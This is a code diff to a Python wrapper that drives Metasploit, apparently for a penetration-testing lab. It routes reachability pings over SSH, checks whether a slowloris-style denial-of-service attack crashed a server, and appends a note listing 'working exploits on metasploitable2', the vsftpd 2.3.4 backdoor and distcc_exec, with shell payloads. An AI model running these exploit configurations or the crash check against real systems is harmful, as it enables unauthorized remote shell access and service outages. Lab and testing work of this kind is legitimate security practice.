@@ -1,7 +1,6 @@
 import re
 import time
 import socket
-from icmplib import ping
 
 from metasploit.api.connections import Metasploit, SSH
 from requests.adapters import ConnectionError
@@ -62,9 +61,11 @@ class MetasploitModule(object):
         try:
             if target:
                 self._target_host = socket.gethostbyname(target)
-                # is_target_reachable = ping(address=self._target_host, privileged=False).is_alive
-                # if not is_target_reachable:
-                #     raise HostIsUnreachable(source_host=self._source_host, target_host=self._target_host)
+                self._ssh = SSH(hostname=source_host)
+                ping_cmd = f"ping -c3 {self._target_host}"
+                is_ping_success, _ = self._ssh.execute_commands(commands=[ping_cmd])
+                if not is_ping_success:
+                    raise HostIsUnreachable(source_host=self._source_host, target_host=self._target_host)
         except socket.gaierror:
             raise InvalidHostName(invalid_host=target)
 
@@ -529,12 +530,11 @@ class Auxiliary(MetasploitModule):
         if job_info:
 
             try:
-                ssh = SSH(hostname=self._source_host)
 
                 for is_success, commands in TimeoutSampler(
                     timeout=wait_for_server_timeout,
                     sleep=sleep,
-                    func=ssh.execute_commands,
+                    func=self._ssh.execute_commands,
                     commands=[is_slowris_success_cmd]
                 ):
                     if not is_success:  # means we managed to make server crash
@@ -558,3 +558,32 @@ class Auxiliary(MetasploitModule):
                 pass
 
         return result if result else {"success": False}
+
+
+"""
+Working exploits on metasploitable2
+
+1)
+{
+    "name": "unix/ftp/vsftpd_234_backdoor",
+    "payloads": {
+        "cmd/unix/interact": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }          
+}
+
+2)
+{
+    "name": "unix/misc/distcc_exec",
+    "payloads": {
+        "cmd/unix/bind_perl": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }          
+}
+
+
+"""
